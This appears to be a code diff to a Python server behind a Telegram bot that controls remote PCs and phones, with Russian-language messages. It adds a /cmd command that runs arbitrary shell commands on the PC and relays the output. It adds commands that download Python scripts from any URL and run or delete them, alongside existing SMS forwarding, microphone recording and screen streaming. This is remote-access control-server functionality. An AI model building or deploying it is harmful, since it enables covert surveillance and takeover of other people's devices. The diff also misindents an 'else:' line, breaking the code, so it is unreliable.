@@ -603,6 +603,13 @@ async def process_update(update: dict):
             f"/name <имя> | Имена: {', '.join(VALID_NAMES)}\n\n"
             "*Микрофон:*\n"
             "/micro <сек> — записать аудио с микрофона ПК\n\n"
+            "*Терминал:*\n"
+            "/cmd <команда> — выполнить команду на ПК (лог в чат)\n\n"
+            "*Python скрипты:*\n"
+            "/listpy — список скриптов\n"
+            "/addpy <url> — скачать скрипт\n"
+            "/runpy <n> — запустить скрипт\n"
+            "/delpy <n> — удалить скрипт\n\n"
             "*WiFi стриминг экрана ПК:*\n"
             "/stream\\_start — запустить трансляцию экрана\n"
             "/stream\\_stop — остановить трансляцию\n\n"
@@ -854,7 +861,59 @@ async def process_update(update: dict):
                 "запрос списка микрофонов")
             await send_tg(chat_id, "⏳ Запрашиваю список микрофонов...")
 
-    else:
+    elif text.startswith("/cmd "):
+        dev_id, err = require_device(chat_id)
+        if err:
+            await send_tg(chat_id, err)
+        else:
+            command = text[5:].strip()
+            if not command:
+                await send_tg(chat_id, "⚠️ Укажи команду: /cmd dir")
+                return
+            await enqueue_multi(chat_id, {"cmd": "run_cmd", "command": command}, f"cmd: {command[:30]}")
+
+    elif text == "/listpy":
+        dev_id, err = require_device(chat_id)
+        if err: await send_tg(chat_id, err)
+        else:
+            await enqueue_multi(chat_id, {"cmd": "get_py_list"}, "список скриптов")
+            await send_tg(chat_id, "⏳ Запрашиваю список скриптов...")
+
+    elif text.startswith("/addpy "):
+        dev_id, err = require_device(chat_id)
+        if err:
+            await send_tg(chat_id, err)
+            return
+        url = text[7:].strip()
+        if not url.startswith("http"):
+            await send_tg(chat_id, "⚠️ Укажи ссылку: /addpy https://...")
+            return
+        await enqueue_multi(chat_id, {"cmd": "fetch_py", "url": url}, "скачать скрипт")
+        await send_tg(chat_id, "📥 Скачиваю скрипт...")
+
+    elif text.startswith("/runpy "):
+        dev_id, err = require_device(chat_id)
+        if err:
+            await send_tg(chat_id, err)
+            return
+        parts = text.split()
+        if len(parts) != 2 or not parts[1].isdigit():
+            await send_tg(chat_id, "⚠️ /runpy 1")
+            return
+        await enqueue_multi(chat_id, {"cmd": "run_py", "num": int(parts[1])}, f"запуск скрипта py{parts[1]}")
+
+    elif text.startswith("/delpy "):
+        dev_id, err = require_device(chat_id)
+        if err:
+            await send_tg(chat_id, err)
+            return
+        parts = text.split()
+        if len(parts) != 2 or not parts[1].isdigit():
+            await send_tg(chat_id, "⚠️ /delpy 1")
+            return
+        await enqueue_multi(chat_id, {"cmd": "del_py", "num": int(parts[1])}, f"удалить py{parts[1]}")
+
+        else:
         await send_tg(chat_id, "❓ /help", reply_markup=main_keyboard())
 
 
@@ -1072,17 +1131,57 @@ async def receive_sms(
 ):
     if x_device_secret != DEVICE_SECRET:
         raise HTTPException(status_code=403, detail="Forbidden")
-
     chat_id = body.get("chat_id") or ALLOWED_CHAT_ID
     sender  = body.get("sender", "Неизвестно")
     text    = body.get("body", "")
     dev_id  = body.get("device_id", "?")
     model   = devices.get(dev_id, {}).get("model", dev_id)
-
     if chat_id and text:
-        await send_tg(
-            chat_id,
-            f"📩 *SMS* — `{sender}`\n_{model}_\n\n{text}"
-        )
+        await send_tg(chat_id, f"📩 *SMS* — `{sender}`\n_{model}_\n\n{text}")
+    return {"ok": True}
 
+
+# ─── Py list endpoint (ПК присылает список скриптов) ─────────────────────────
+
+@app.post("/py_list")
+async def py_list_endpoint(
+    body: dict,
+    x_device_secret: Optional[str] = Header(None),
+):
+    if x_device_secret != DEVICE_SECRET:
+        raise HTTPException(status_code=403, detail="Forbidden")
+    chat_id = body.get("chat_id") or ALLOWED_CHAT_ID
+    scripts = body.get("scripts", [])  # [{name, filename}, ...]
+    if not scripts:
+        await send_tg(chat_id, "📭 Нет скриптов. Добавь через /addpy <url>")
+        return {"ok": True}
+    lines = ["📋 *Python скрипты на ПК:*\n"]
+    for s in scripts:
+        lines.append(f"`{s['name']}` — {s['filename']}")
+    lines.append("\n▶️ /runpy <номер> — запустить")
+    lines.append("🗑 /delpy <номер> — удалить")
+    await send_tg(chat_id, "\n".join(lines))
+    return {"ok": True}
+
+
+# ─── Cmd output endpoint (ПК присылает лог команды) ──────────────────────────
+
+@app.post("/cmd_output")
+async def cmd_output(
+    body: dict,
+    x_device_secret: Optional[str] = Header(None),
+):
+    if x_device_secret != DEVICE_SECRET:
+        raise HTTPException(status_code=403, detail="Forbidden")
+    chat_id = body.get("chat_id") or ALLOWED_CHAT_ID
+    output  = body.get("output", "")
+    command = body.get("command", "")
+    dev_id  = body.get("device_id", "?")
+    model   = devices.get(dev_id, {}).get("model", dev_id)
+    if chat_id:
+        # Режем если очень длинный (лимит TG 4096 символов)
+        text = output[:3800] if len(output) > 3800 else output
+        suffix = "\n\n_...вывод обрезан_" if len(output) > 3800 else ""
+        await send_tg(chat_id,
+            f"💻 *{model}* — `{command}`\n\n```\n{text}\n```{suffix}")
     return {"ok": True}
